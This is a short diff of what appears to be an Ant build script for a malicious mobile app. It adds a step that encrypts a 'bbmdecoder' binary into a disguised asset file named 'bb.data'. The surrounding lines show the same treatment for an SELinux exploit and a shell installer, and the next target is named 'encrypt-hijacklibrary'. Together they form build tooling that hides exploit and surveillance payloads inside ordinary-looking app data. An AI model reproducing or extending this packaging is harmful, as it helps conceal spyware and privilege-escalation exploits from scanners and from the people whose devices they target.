@@ -126,7 +126,10 @@
         <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}o" inputFile="preprocess/selinux4_exploit" outputFile="assets/ob.data" />
 		<delete file="assets/kb.data" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}k" inputFile="preprocess/shell_installer.sh" outputFile="assets/kb.data" />
-	</target>
+        <delete file="assets/bb.data" />
+        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}b" inputFile="preprocess/bbmdecoder" outputFile="assets/bb.data" />
+
+    </target>
 
 	<target name="encrypt-hijacklibrary">
 		<delete file="assets/ib.data" />
